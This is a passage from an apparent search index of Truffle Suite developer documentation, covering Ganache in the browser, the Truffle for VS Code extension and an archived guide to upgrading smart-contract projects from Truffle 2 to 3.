manipulating time during testing: evm_increaseTime evm_setTime", "title": "Time manipulation"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#ganache-in-the-browser", "text": "Ganache can be used in the browser with this line of code: <script src=\"[https://cdn.jsdelivr.net/npm/ganache@](https://cdn.jsdelivr.net/npm/ganache@)>VERSION NUMBER>/dist/web/ganache.min.js\"></script> If you specify the version number 7.3.2 or greater, you also get the zero-config mainnet forking feature. The latest version as of the time of writing is 7.8.0. You can try this out with the below code sample. <script src=\"https://cdn.jsdelivr.net/npm/ganache@7.8.0/dist/web/ganache.min.js\"></script> <script> const options = { fork: { network: \"mainnet\" } } const provider = Ganache.provider(options); <script> Now verify that this is working by attempting to fetch a mainnet block using the eth_getBlockByNumber method: const block = await provider.request({ method: \"eth_getBlockByNumber\", params: [\"0xec4eb0\"] }); console.log(block); // will be mainnet's block 15486640 Here\u2019s a sample HTML code that puts it all together: <!DOCTYPE html> <html> <head> <meta charset=\"UTF-8\"> <title>Ganache Example</title> </head> <body> <h1>Ganache Example</h1> <script src=\"https://cdn.jsdelivr.net/npm/ganache@7.8.0/dist/web/ganache.min.js\"></script> <script> (async function() { const options = { fork: { network: \"mainnet\" } } const provider = Ganache.provider(options); const block = await provider.request({ method: \"eth_getBlockByNumber\", params: [\"0xec4eb0\"] }); console.log(block); // will be mainnet's block 15486640 })() </script> </body> </html>", "title": "Ganache in the browser"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#part-seven-truffle-for-vs-code-extension", "text": "The Truffle for VS Code extension simplifies how you create, build, debug and deploy smart contracts on Ethereum and all EVM-based blockchains and layer 2. The extension has built-in integration with many tools and services including Truffle, Ganache, and Infura. It combines all the important features of Truffle CLI, Ganache and Infura into a single, more user-friendly user experience so that you do not have to leave Visual Studio while building a dapp. Truffle for VS Code also offers comprehensive native IDE Solidity debugging support, taking advantage of VS Code's great debugging features such as variables, watches, and breakpoints. This means that you no longer need to jump between different tools or windows while you edit, compile, deploy, transact, and debug smart contracts.", "title": "Part seven: Truffle for VS Code Extension"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#installation_3", "text": "Truffle for VS Code can be installed from the VS Code marketplace . After installation, the extension may ask you to install certain local dependencies if you haven't done so already. But, don't worry! We have created a helpful guide to make the installation process smooth and easy.", "title": "Installation"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#create-project", "text": "The Truffle extension for VS Code provides an easy way for developers to create a new Solidity project using the Command Palette. If you are not familiar with Truffle, this is a simple way to scaffold out a project directory. Just select \"Truffle: New Solidity Project\" from the Command Palette, choose an empty directory, give your project a name, and hit Enter. Alternatively, you can also use the Truffle CLI directly from the VS Code terminal by running truffle init .", "title": "Create project"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#compile-contract", "text": "After creating a project directory, it will include a basic contract and all the necessary files to build and deploy a simple working contract to an RPC endpoint. To build your contract, simply select the Solidity (.sol) file of your contract, right-click on it, and choose \"Truffle: Build Contracts\". That's it!", "title": "Compile contract"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#deploy-contract", "text": "Once you've compiled your contract, the contract metadata (including the contract ABI and bytecode) will be available in a .json file located in the ./build directory. To deploy your compiled contract, right-click on the Solidity (.sol) file and select \"Truffle: Deploy Contracts\". The extension will start a Ganache instance by default and deploy the contract to a local network. For more information on how you can deploy to any Ethereum network through Infura, see Truffle for VS Code documentation. .", "title": "Deploy contract"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#debug-contract", "text": "Truffle for VS Code extension comes bundled with the Truffle debugger, you can use the debugger by following these steps: Start the debugger by selecting Truffle: Debug Transaction in the command palette which can be accessed using Ctrl + Shift + P for Windows or \u2318 + Shift + P for Macs. Then select the network to debug against. Select the transaction hash to debug. The VSCode debugger launches, and you can use typical debugger functions such as watch windows, view the call stack, and step in/out/over. See the documentation for more information.", "title": "Debug contract"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#conclusion", "text": "Truffle simplifies the development lifecycle for EVM-based applications. Its library-first approach and suite of developer tools for every stage of development enable developers to ensure their code is thoroughly tested and ready for deployment, while reducing the risk of bugs and errors. Building with Truffle has several benefits, including increased efficiency, reduced development time, and improved code quality. Truffle can be easily integrated with other tools, giving you even more power and flexibility to create blockchain applications. The Truffle Suite, which includes a Command Line Interface, Dashboard, Ganache, and VS Code Extension, all work together seamlessly to help you create, test, and deploy your blockchain applications with ease. If you're a blockchain developer looking to enhance your development experience, consider Truffle as an essential resource for full stack blockchain development.", "title": "Conclusion"}, {"location": "guides/upgrading-from-truffle-2-to-3/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Note: This guide also applies to users upgrading from Truffle beta 3.0.0-9 to Truffle 3.0.1 Introduction \u00b6 Truffle 3.0 offers a ton of new features. With it comes some very important breaking changes. These breaking changes make network management easier, make contract abstractions easier to use, and allow you to install third party packages from any number of sources. We consider these breaking changes helpful -- they're due to the careful maturation of Ethereum's most popular development tool, and we'll guide you through the steps needed to take advantage of all these new features. In order to show you code samples that describe the evolution from 2.0 to 3.0, we're going to use examples like this: v2.0: // This is old code from Truffle 2.0 v3.0: // This is new code for Truffle 3.0! Now let's get started! First Things First: Configuration \u00b6 Truffle 2.0 had an odd configuration -- we admit it. Not only can you have a default, unnamed network sitting around (the rpc configuration option) but you can also have named networks like \"ropsten\" or \"live\" . A result of this default vs. named distinction came were other oddities, such as accidentally overwriting important network artifacts or deploying to the wrong network. With Truffle 3.0 we fixed all that, but it requires a change in your configuration. In v2.0, a configuration with a named network might look like this: module . exports = { rpc : { host : \"localhost\" , port : 8545 , }, networks : { staging : { host : \"localhost\" , port : 8546 , network_id : 1337 , }, ropsten : { host : \"158.253.8.12\" , port : 8545 , network_id : 3 , }, }, }; In v3.0, this same configuration would look like this: module . exports = { networks : { development : { host : \"localhost\" , port : 8545 , network_id : \"*\" , }, staging : { host : \"localhost\" , port : 8546 , network_id : 1337 , }, ropsten : { host : \"158.253.8.12\" , port : 8545 , network_id : 3 , }, }, }; What's the difference? First, there's no default network anymore: the rpc configuration item has been removed. In its place is a specially named development network. This is a network that will match any network it connects to at the specified host and port, and when running commands like migrate Truffle will default to this network if none is specified. If you'd like to protect yourself from deploying to the wrong network completely, you can remove the development configuration entirely; if you don't specify the network via truffle migrate --network ropsten , for example, Truffle will exit with an error, ensuring you never deploy to a network you don't intend to. Additionally, each network needs to have a network id specified, or a \"*\" . This is another security measure used during migrations to ensure that even if Truffle connects to the Ethereum client at the specified host and port, if it's not the network you intend, Truffle will error before attempting any deployments. Importing and the Ethereum Package Manager (EthPM) \u00b6 As Truffle 3.0 uses the new Ethereum Package Manager (EthPM) we need to tell Truffle when the package manager should be used and when to look in the local directory. If you don't specify the directory to search relative to the contracts/ directory, it will assume that EthPM will handle this. So to import a local file: v2.0: import \"test.sol\" v3.0: import \"./test.sol\" The ./ tells Truffle that the contract is in the current directory. See the Compiling contracts page for more details. Migrations and Test Dependencies \u00b6 Before package management, Truffle could assume that all the contracts you wrote yourself were the contracts you wanted to interact with via your migrations and tests. Now that package management is here, this is no longer a safe assumption -- contract dependencies can come from any number of sources, and so you have to explicitly ask for those abstractions yourself. This is all in the name of reducing magic. Let's look at an example migration. v2.0 : ./migrations/2_deploy_contracts.js module . exports = function ( deployer ) { deployer . deploy ( ConvertLib ); deployer . autolink (); deployer . deploy ( MetaCoin ); }; v3.0 : ./migrations/2_deploy_contracts.js var ConvertLib = artifacts . require ( \"ConvertLib.sol\" ); var MetaCoin = artifacts . require ( \"MetaCoin.sol\" ); module . exports = function ( deployer ) { deployer . deploy ( ConvertLib ); deployer . link ( ConvertLib , MetaCoin ); deployer . deploy ( MetaCoin ); }; Note there are a couple differences. For this section, the changes we'll focus on are the two lines which use artifacts.require() . This is a function similar to Node's require() statement provided by Truffle. If given a path to a solidity file local to your project, or the path of a package dependency, this function will locate the correct artifacts and make them ready for use on your current network. Your Javascript tests need the exact same artifacts.require() statements in order to use those abstractions like before. Migrations: No more autolink \u00b6 Like the section above, autolinking was a boon of a very small dependency tree. With package management, Truffle can no longer autolink your contracts because it can't determine all possible dependencies you might need within your migration. Instead, you need to explicitly link your libraries yourself. Fortunately this is not hard, and you can see the changes we made in the example above. Contract Abstractions: All JSON (goodbye .sol.js!) \u00b6 Truffle had originally saved your contract abstractions on disk in .sol.js files. These files were Javascript files that represented specific solidity files in your project, hence the file extension, and they were originally intended to make your contract artifacts really easy to use, everywhere. Well, it turns out we got it wrong. Really wrong. Not only were these files hard to use within Javascript in certain cases, but they were completely unusable if you wanted to use them outside of Javascript. To overcome this limitation and make your contract artifacts available everywhere, Truffle 3.0 now saves all artifacts within the JSON format. So what should you do if you've been using Truffle 2.0 and have important contract artifacts you'd like to save? Easy. Upgrade them! We built you a handy tool that does just that. To upgrade your .sol.js files, first install truffle-soljs-updater globally via npm: $ npm install -g truffle-soljs-updater This will provide the sjsu command available for your use. Next, navigate to the directory where your .sol.js files are stored (usually ./build/contracts ), and run sjsu . Your output should look something like this: $ cd ./build/contracts $ sjsu Converting ConvertLib.sol.js... Converting MetaCoin.sol.js... Converting Migrations.sol.js... Files converted successfully. By default sjsu only creates newer, .json versions of your artifacts and leaves the original .sol.js files alone. You'll need to remove the .sol.js files from this directory in order for Truffle 3.0 to function properly. Before removing, check to ensure that the converted .json files were created properly, and perhaps as a safeguard backup your old .sol.js files somewhere else before continuing. Once you're sure all data was copied correctly and you have a nice backup, you can run sjsu with the -f parameter. This will tell sjsu to delete the existing .sol.js files. Your output should look something like this: $ cd ./build/contracts $ sjsu -f Converting ConvertLib.sol.js... Converting MetaCoin.sol.js... Converting Migrations.sol.js... Files converted successfully. Successfully deleted old .sol.js files. And that's it! You're now ready to move onto the next step. Contract Abstractions: .deployed() is now thennable \u00b6 \u26a0\ufe0f Warning: This change will affect your migrations, your tests, and your application code! \u26a0\ufe0f In Truffle 2.0, your contract abstractions managed your networks in a naive way, and added constructs like a \"default network\" that opened up the possibility of using the wrong network artifacts and deployed addresses at the wrong time. This provided a fancy and easy to use syntax -- i.e., MyContract.deployed().myFunction(...) -- but it left your code open to errors. Truffle 3.0 changes this syntax, where .deployed() is now thennable, like a promise (see example below). Similarly, this makes your contract abstractions seamlessly integrate with EIP 190 , Ethereum's package management standard. All of this is for the better, but it means you'll have some changes to make all across the board. In the general use case, here is how the new syntax differs from the old: v2.0 MyContract . setProvider ( someWeb3Provider ); MyContract . deployed () . someFunction () . then ( function ( tx ) { // Do something after the someFunction() transaction executed }); v3.0 MyContract . setProvider ( someWeb3Provider ); MyContract . deployed () . then ( function ( instance ) { return instance . someFunction (); }) . then ( function ( result ) { // Do something after the someFunction() transaction executed }); This syntax is a little more verbose, but it ensures the correct network artifacts are used based on the Ethereum client the abstraction is connected to. Note that in v3.0, you may need to correctly scope your deployed instance if you want to perform multiple actions with it in the same promise chain: MyContract . setProvider ( someWeb3Provider ); var deployed ; MyContract . deployed () . then ( function ( instance ) { deployed = instance ; return deployed . someFunction (); }) . then ( function ( result ) { return deployed . anotherFunction (); }) . then ( function ( result ) { // etc. }); Contract Abstractions: Transaction result objects \u00b6 People have long complained that events are hard to watch for in Web3. Similarly, in most use cases, events aren't used via a contract observer pattern; instead, in practice, events are used to check specific results of a specific transaction. Though the contract observer pattern for events is still available, we made the latter use case much easier, which required breaking changes to the return value of transactions. In v2.0, a transaction simply returned the transaction hash. In v3.0, transactions return a result object with a wealth of information about that transaction. v2.0 MyContract . deployed () . someFunction () . then ( function ( tx ) { // tx is the transaction id (hash) of the transaction executed }); v3.0 MyContract . deployed () . then ( function ( instance ) { deployed = instance ; return deployed . someFunction (); }) . then ( function ( result ) { // result is an object with the following values: // // result.tx => transaction hash, string // result.logs => array of decoded events that were triggered within this transaction // result.receipt => transaction receipt object, which includes gas used }); In Truffle 3.0, it's now much easier to detect if an event was fired as a result of your transaction. Here's a Javascript test for a hypothetical PackageIndex contract and ReleasePublished event: var assert = require ( \"assert\" ); var PackageIndex = artifacts . require ( \"PackageIndex.sol\" ); contract ( \"PackageIndex\" , function ( accounts ) { it ( \"publishes a release correctly\" , function () { return PackageIndex . deployed () . then ( function ( deployed ) { return deployed . publish ( \"v2.0.0\" ); }) . then ( function ( result ) { // This result object is what provides us with the information we need. // result.logs, specifically for this example. var found_published_event = false ; for ( var i = 0 ; i < result . logs . length ; i ++ ) { var log = result . logs [ i ]; if ( log . event == \"ReleasePublished\" ) { found_published_event = true ; break ; } } assert ( found_published_event , \"Uh oh! We didn't find the published event!\" ); }); }); }); We have to search through all returned events to ensure we found the one we wanted, but this is certainly better than using PackageIndex.ReleasePublished.watch(...) , and we can keep event processing within our application's (or test's) normal control flow. Build Pipeline: No more builder, by default \u00b6 In Truffle 1.0 and 2.0, things were heavily geared toward building web applications, and so Truffle shipped with a default build pipeline that could get your dapp up and running quickly. This build pipeline was magical: It did everything for you, and you didn't have to lift a finger. This was good for some use cases, but it became evidently clear that in any other use case the pipeline was very brittle. Over the last year, Ethereum-enabled applications have only been growing. What started out as solely a platform for web application, now dapps can be written in native languages and run as standalone applications on mobile and the desktop. Truffle has always intended to support these use cases, and so that's why we removed the default build pipeline from Truffle. You can still write your own custom build pipeline if you'd like to tightly integrate it with Truffle, but by default Truffle will focus on continuing to be the best tool for smart contracts around. We'll let the better build pipelines -- like webpack , browserify , Grunt , Metalsmith -- do the job of, well, building. Now, just because the build pipeline has been removed by default doesn't mean you don't have options. At Truffle, we care about your developer experience and so would never leave you hanging. In general there are two options for you to choose from, but for the latter option what you'll do is heavily dependent on which build tool (i.e., webpack) you choose to use. Let's go over the options below. Use the old pipeline in Truffle 3.0 \u00b6 If you're using the default build pipeline in Truffle 2.0 and would like to upgrade to 3.0, you're not out of luck. We've upgraded the truffle-default-builder so it can work seamlessly with Truffle 3.0. This will be the last time we update the default builder though as engineering for all possible use cases is too complex. So we recommend you eventually choose a different build system later down the line. The default builder no longer ships with Truffle by default. So for Truffle 3.0, you first need to make truffle-default-builder a dependency of your project by running the following command within your project's folder: $ npm install truffle-default-builder --save Once installed, you can use the default builder within your truffle.js configuration file. Let's have a look at how your configuration file changes from v2.0 to v3.0, using a very simple build configuration: v2.0 : truffle.js module . exports = { build : { \"index.html\" : \"index.html\" , \"app.js\" : [ \"javascripts/app.js\" ], \"app.css\" : [ \"stylesheets/app.css\" ], \"images/\" : \"images/\" , }, rpc : { host : \"localhost\" , port : 8545 , }, }; v3.0 : truffle.js var DefaultBuilder = require ( \"truffle-default-builder\" ); module . exports = { build : new DefaultBuilder ({ \"index.html\" : \"index.html\" , \"app.js\" : [ \"javascripts/app.js\" ], \"app.css\" : [ \"stylesheets/app.css\" ], \"images/\" : \"images/\" , }), networks : { development : { host : \"localhost\" , port : 8545 , network_id : \"*\" , // Match any network id }, }, }; You'll notice that in version 3.0 we require 'd the default builder as a dependency and then passed that object into our configuration. Otherwise, the configuration was the same! Now, be aware that the default builder does use the latest contract abstractions ( truffle-contract ), so you will still need to edit your application to account for the breaking changes mentioned above. Use a custom build process / build tool \u00b6 Custom build processes are not hard to write. Instead, what's hard is writing a build process that fits all shapes and sizes. We now recommend you look into the many build tools available to you that best fits your application. We've already mentioned webpack , browserify , Grunt , and Metalsmith , but there are many others, and their features run the gamut based on the context of the application being built and the features that you need. Whether you're building an application to run in the browser, or a command line tool, a Javascript library or a native mobile application, bootstrapping your contracts is the same, and using your deployed contract artifacts follows the same general process no matter the app you're building. When configuring your build tool or application, you'll need to perform the following steps; Get all your contract artifacts into your build pipeline / application. This includes all of the .json files within the ./build/contracts directory. Turn those .json contract artifacts into contract abstractions that are easy to use, via truffle-contract . Provision those contract abstractions with a Web3 provider. In the browser, this provider might come from Metamask or Mist , but it could also be a custom provider you've configured to point to Infura or any other Ethereum client. Use your contracts! In Node, this is very easy to do. Let's take a look at an example that shows off the \"purest\" way of performing the above steps, since it exists outside of any build process or tool. // Step 1: Get a contract into my application var json = require ( \"./build/contracts/MyContract.json\" ); // Step 2: Turn that contract into an abstraction I can use var contract = require ( \"truffle-contract\" ); var MyContract = contract ( json ); // Step 3: Provision the contract with a web3 provider MyContract . setProvider ( new Web3 . providers . HttpProvider ( \"http://localhost:8545\" ) ); // Step 4: Use the contract! MyContract . deployed (). then ( function ( deployed ) { return deployed . someFunction (); }); All build processes and contract bootstrapping will follow this pattern. The key when setting up your own custom build process is to ensure you're consuming all of your contract artifacts and provisioning your abstractions correctly. Fin \u00b6 That's it! That's all you need to know to upgrade from Truffle 2.0 to 3.0. It might require a bit of work, but the changes are surely worth it. If you have questions, Truffle has a vibrant community of Trufflers available 24/7 to help you with any issues you may have. Don't hesitate to ask for help, and we wish you a happy 3.0! -- The Truffle Team", "title": "Truffle Suite"}, {"location": "guides/upgrading-from-truffle-2-to-3/#introduction", "text": "Truffle 3.0 offers a ton of new features. With it comes some very important breaking changes. These breaking changes make network management easier, make contract abstractions easier to use, and allow you to install third party packages from any number of sources. We consider these breaking changes helpful -- they're due to the careful maturation of Ethereum's most popular development tool, and we'll guide you through the steps needed to take advantage of all these new features. In order to show you code samples that describe the evolution from 2.0 to 3.0, we're going to use examples like this: v2.0: // This is old code from Truffle 2.0 v3.0: // This is new code for Truffle 3.0! Now let's get started!", "title": "Introduction"}, {"location": "guides/upgrading-from-truffle-2-to-3/#first-things-first-configuration", "text": "Truffle 2.0 had an odd configuration -- we admit it. Not only can you have a default, unnamed network sitting around (the rpc configuration option) but you can also have named networks like \"ropsten\" or \"live\" . A result of this default vs. named distinction came were other oddities, such as accidentally overwriting important network artifacts or deploying to the wrong network. With Truffle 3.0 we fixed all that, but it requires a change in your configuration. In v2.0, a configuration with a named network might look like this: module . exports = { rpc : { host : \"localhost\" , port : 8545 , }, networks : { staging : { host : \"localhost\" , port : 8546 , network_id : 1337 , }, ropsten : { host : \"158.253.8.12\" , port : 8545 , network_id : 3 , }, }, }; In v3.0, this same configuration would look like this: module . exports = { networks : { development : { host : \"localhost\" , port : 8545 , network_id : \"*\" , }, staging : { host : \"localhost\" , port : 8546 , network_id : 1337 , }, ropsten : { host : \"158.253.8.12\" , port : 8545 , network_id : 3 , }, }, }; What's the difference? First, there's no default network anymore: the rpc configuration item has been removed. In its place is a specially named development network. This is a network that will match any network it connects to at the specified host and port, and when running commands like migrate Truffle will default to this network if none is specified. If you'd like to protect yourself from deploying to the wrong network completely, you can remove the development configuration entirely; if you don't specify the network via truffle migrate --network ropsten , for example, Truffle will exit with an error, ensuring you never deploy to a network you don't intend to. Additionally, each network needs to have a network id specified, or a \"*\" . This is another security measure used during migrations to ensure that even if Truffle connects to the Ethereum client at the specified host and port, if it's not the network you intend, Truffle will error before attempting any deployments.", "title": "First Things First: Configuration"}, {"location": "guides/upgrading-from-truffle-2-to-3/#importing-and-the-ethereum-package-manager-ethpm", "text": "As Truffle 3.0 uses the new Ethereum Package Manager (EthPM) we need to tell Truffle when the package manager should be used and when to look in the local directory. If you don't specify the directory to search relative to the contracts/ directory, it will assume that EthPM will handle this. So to import a local file: v2.0: import \"test.sol\" v3.0: import \"./test.sol\" The ./ tells Truffle that the contract is in the current directory. See the Compiling contracts page for more details.", "title": "Importing and the Ethereum Package Manager (EthPM)"}, {"location": "guides/upgrading-from-truffle-2-to-3/#migrations-and-test-dependencies", "text": "Before package management, Truffle could assume that all the contracts you wrote yourself were the contracts you wanted to interact with via your migrations and tests. Now that package management is here, this is no longer a safe assumption -- contract dependencies can come from any number of sources, and so you have to explicitly ask for those abstractions yourself. This is all in the name of reducing magic. Let's look at an example migration. v2.0 : ./migrations/2_deploy_contracts.js module . exports = function ( deployer ) { deployer . deploy ( ConvertLib ); deployer . autolink (); deployer . deploy ( MetaCoin ); }; v3.0 : ./migrations/2_deploy_contracts.js var ConvertLib = artifacts . require ( \"ConvertLib.sol\" ); var MetaCoin = artifacts . require ( \"MetaCoin.sol\" ); module . exports = function ( deployer ) { deployer . deploy ( ConvertLib ); deployer . link ( ConvertLib , MetaCoin ); deployer . deploy ( MetaCoin ); }; Note there are a couple differences. For this section, the changes we'll focus on are the two lines which use artifacts.require() . This is a function similar to Node's require() statement provided by Truffle. If given a path to a solidity file local to your project, or the path of a package dependency, this function will locate the correct artifacts and make them ready for use on your current network. Your Javascript tests need the exact same artifacts.require() statements in order to use those abstractions like before.", "title": "Migrations and Test Dependencies"}, {"location": "guides/upgrading-from-truffle-2-to-3/#migrations-no-more-autolink", "text": "Like the section above, autolinking was a boon of a very small dependency tree. With package management, Truffle can no longer autolink your contracts because it can't determine all possible dependencies you might need within your migration. Instead, you need to explicitly link your libraries yourself. Fortunately this is not hard, and you can see the changes we made in the example above.", "title": "Migrations: No more autolink"}, {"location": "guides/upgrading-from-truffle-2-to-3/#contract-abstractions-all-json-goodbye-soljs", "text": "Truffle had originally saved your contract abstractions on disk in .sol.js files. These files were Javascript files that represented specific solidity files in your project, hence the file extension, and they were originally intended to make your contract artifacts really easy to use, everywhere. Well, it turns out we got it wrong. Really wrong. Not only were these files hard to use within Javascript in certain cases, but they were completely unusable if you wanted to use them outside of Javascript. To overcome this limitation and make your contract artifacts available everywhere, Truffle 3.0 now saves all artifacts within the JSON format. So what should you do if you've been using Truffle 2.0 and have important contract artifacts you'd like to save? Easy. Upgrade them! We built you a handy tool that does just that. To upgrade your .sol.js files, first install truffle-soljs-updater globally via npm: $ npm install -g truffle-soljs-updater This will provide the sjsu command available for your use. Next, navigate to the directory where your .sol.js files are stored (usually ./build/contracts ), and run sjsu . Your output should look something like this: $ cd ./build/contracts $ sjsu Converting ConvertLib.sol.js... Converting MetaCoin.sol.js... Converting Migrations.sol.js... Files converted successfully. By default sjsu only creates newer, .json versions of your artifacts and leaves the original .sol.js files alone. You'll need to remove the .sol.js files from this directory in order for Truffle 3.0 to function properly. Before removing, check to ensure that the converted .json files were created properly, and perhaps as a safeguard backup your old .sol.js files somewhere else before continuing. Once you're sure all data was copied correctly and you have a nice backup, you can run sjsu with the -f parameter. This will tell sjsu to delete the existing .sol.js files. Your output should look something like this: $ cd ./build/contracts $ sjsu -f Converting ConvertLib.sol.js... Converting MetaCoin.sol.js... Converting Migrations.sol.js... Files converted successfully. Successfully deleted old .sol.js files. And that's it! You're now ready to move onto the next step.", "title": "Contract Abstractions: All JSON (goodbye .sol.js!)"}, {"location": "guides/upgrading-from-truffle-2-to-3/#contract-abstractions-deployed-is-now-thennable", "text": "\u26a0\ufe0f Warning: This change will affect your migrations, your tests, and your application code! \u26a0\ufe0f In Truffle 2.0, your contract abstractions managed your networks in a naive way, and added constructs like a \"default network\" that opened up the possibility of using the wrong network artifacts and deployed addresses at the wrong time. This provided a fancy and easy to use syntax -- i.e., MyContract.deployed().myFunction(...) -- but it left your code open to errors. Truffle 3.0 changes this syntax, where .deployed() is now thennable, like a promise (see example below). Similarly, this makes your contract abstractions seamlessly integrate with EIP 190 , Ethereum's package management standard. All of this is for the better, but it means you'll have some changes to make all across the board. In the general use case, here is how the new syntax differs from the old: v2.0 MyContract . setProvider ( someWeb3Provider ); MyContract . deployed () . someFunction () . then ( function ( tx ) { // Do something after the someFunction() transaction executed }); v3.0 MyContract . setProvider ( someWeb3Provider ); MyContract . deployed () . then ( function ( instance ) { return instance . someFunction (); }) . then ( function ( result ) { // Do something after the someFunction() transaction executed }); This syntax is a little more verbose, but it ensures the correct network artifacts are used based on the Ethereum client the abstraction is connected to. Note that in v3.0, you may need to correctly scope your deployed instance if you want to perform multiple actions with it in the same promise chain: MyContract . setProvider ( someWeb3Provider ); var deployed ; MyContract . deployed () . then ( function ( instance ) { deployed = instance ; return deployed . someFunction (); }) . then ( function ( result ) { return deployed . anotherFunction (); }) . then ( function ( result ) { // etc. });", "title": "Contract Abstractions: .deployed() is now thennable"}, {"location": "guides/upgrading-from-truffle-2-to-3/#contract-abstractions-transaction-result-objects", "text": "People have long complained that events are hard to watch for in Web3. Similarly, in most use cases, events aren't used via a contract observer pattern; instead, in practice, events are used to check specific results of a specific transaction. Though the contract observer pattern for events is still available, we made the latter use case much easier, which required breaking changes to the return value of transactions. In v2.0, a transaction simply returned the transaction hash. In v3.0, transactions return a result object with a wealth of information about that transaction. v2.0 MyContract . deployed () . someFunction () . then ( function ( tx ) { // tx is the transaction id (hash) of the transaction executed }); v3.0 MyContract . deployed () . then ( function ( instance ) { deployed = instance ; return deployed . someFunction (); }) . then ( function ( result ) { // result is an object with the following values: // // result.tx => transaction hash, string // result.logs => array of decoded events that were triggered within this transaction // result.receipt => transaction receipt object, which includes gas used }); In Truffle 3.0, it's now much easier to detect if an event was fired as a result of your transaction. Here's a Javascript test for a hypothetical PackageIndex contract and ReleasePublished event: var assert = require ( \"assert\" ); var PackageIndex = artifacts . require ( \"PackageIndex.sol\" ); contract ( \"PackageIndex\" , function ( accounts ) { it ( \"publishes a release correctly\" , function () { return PackageIndex . deployed () . then ( function ( deployed ) { return deployed . publish ( \"v2.0.0\" ); }) . then ( function ( result ) { // This result object is what provides us with the information we need. // result.logs, specifically for this example. var found_published_event = false ; for ( var i = 0 ; i < result . logs . length ; i ++ ) { var log = result . logs [ i ]; if ( log . event == \"ReleasePublished\" ) { found_published_event = true ; break ; } } assert ( found_published_event , \"Uh oh! We didn't find the published event!\" ); }); }); }); We have to search through all returned events to ensure we found the one we wanted, but this is certainly better than using PackageIndex.ReleasePublished.watch(...) , and we can keep event processing within our application's (or test's) normal control flow.", "title": "Contract Abstractions: Transaction result objects"}, {"location": "guides/upgrading-from-truffle-2-to-3/#build-pipeline-no-more-builder-by-default", "text": "In Truffle 1.0 and 2.0, things were heavily geared toward building web applications, and so Truffle shipped with a default build pipeline that could get your dapp up and running quickly. This build pipeline was magical: It did everything for you, and you didn't have to lift a finger. This was good for some use cases, but it became evidently clear that in any other use case the pipeline was very brittle. Over the last year, Ethereum-enabled applications have only been growing. What started out as solely a platform for web application, now dapps can be written in native languages and run as standalone applications on mobile and the desktop. Truffle has always intended to support these use cases, and so that's why we removed the default build pipeline from Truffle. You can still write your own custom build pipeline if you'd like to tightly integrate it with Truffle, but by default Truffle will focus on continuing to be the best tool for smart contracts around. We'll let the better build pipelines -- like webpack , browserify , Grunt , Metalsmith -- do the job of, well, building. Now, just because the build pipeline has been removed by default doesn't mean you don't have options. At Truffle, we care about your developer experience and so would never leave you hanging. In general there are two options for you to choose from, but for the latter option what you'll do is heavily dependent on which build tool (i.e., webpack) you choose to use. Let's go over the options below.", "title": "Build Pipeline: No more builder, by default"}, {"location": "guides/upgrading-from-truffle-2-to-3/#use-the-old-pipeline-in-truffle-30", "text": "If you're using the default build pipeline in Truffle 2.0 and would like to upgrade to 3.0, you're not out of luck. We've upgraded the truffle-default-builder so it can work seamlessly with Truffle 3.0. This will be the last time we update the default builder though as engineering for all possible use cases is too complex. So we recommend you eventually choose a different build system later down the line. The default builder no longer ships with Truffle by default. So for Truffle 3.0, you first need to make truffle-default-builder a dependency of your project by running the following command within your project's folder: $ npm install truffle-default-builder --save Once installed, you can use the default builder within your truffle.js configuration file. Let's have a look at how your configuration file changes from v2.0 to v3.0, using a very simple build configuration: v2.0 : truffle.js module . exports = { build : { \"index.html\" : \"index.html\" , \"app.js\" : [ \"javascripts/app.js\" ], \"app.css\" : [ \"stylesheets/app.css\" ], \"images/\" : \"images/\" , }, rpc : { host : \"localhost\" , port : 8545 , }, }; v3.0 : truffle.js var DefaultBuilder = require ( \"truffle-default-builder\" ); module . exports = { build : new DefaultBuilder ({ \"index.html\" : \"index.html\" , \"app.js\" : [ \"javascripts/app.js\" ], \"app.css\" : [ \"stylesheets/app.css\" ], \"images/\" : \"images/\" , }), networks : { development : { host : \"localhost\" , port : 8545 , network_id : \"*\" , // Match any network id }, }, }; You'll notice that in version 3.0 we require 'd the default builder as a dependency and then passed that object into our configuration. Otherwise, the configuration was the same! Now, be aware that the default builder does use the latest contract abstractions ( truffle-contract ), so you will still need to edit your application to account for the breaking changes mentioned above.", "title": "Use the old pipeline in Truffle 3.0"}, {"location": "guides/upgrading-from-truffle-2-to-3/#use-a-custom-build-process-build-tool", "text": "Custom build processes are not hard to write. Instead, what's hard is writing a build process that fits all shapes and sizes. We now recommend you look into the many build tools available to you that best fits your application. We've already mentioned webpack , browserify , Grunt , and Metalsmith , but there are many others, and their features run the gamut based on the context of the application being built and the features that you need. Whether you're building an application to run in the browser, or a command line tool, a Javascript library or a native mobile application, bootstrapping your contracts is the same, and using your deployed contract artifacts follows the same general process no matter the app you're building. When configuring your build tool or application, you'll need to perform the following steps; Get all your contract artifacts into your build pipeline / application. This includes all of the .json files within the ./build/contracts directory. Turn those .json contract artifacts into contract abstractions that are easy to use, via truffle-contract . Provision those contract abstractions with a Web3 provider. In the browser, this provider might come from Metamask or Mist , but it could also be a custom provider you've configured to point to Infura or any other Ethereum client. Use your contracts! In Node, this is very easy to do. Let's take a look at an example that shows off the \"purest\" way of performing the above steps, since it exists outside of any build process or tool. // Step 1: Get a contract into my application var json = require ( \"./build/contracts/MyContract.json\" ); // Step 2: Turn that contract into an abstraction I can use var contract = require ( \"truffle-contract\" ); var MyContract = contract ( json ); // Step 3: Provision the contract with a web3 provider MyContract . setProvider ( new Web3 . providers . HttpProvider ( \"http://localhost:8545\" ) ); // Step 4: Use the contract! MyContract . deployed (). then ( function ( deployed ) { return deployed . someFunction (); }); All build processes and contract bootstrapping will follow this pattern. The key when setting up your own custom build process is to ensure you're consuming all of your contract artifacts and provisioning your abstractions correctly.", "title": "Use a custom build process / build tool"}, {"location": 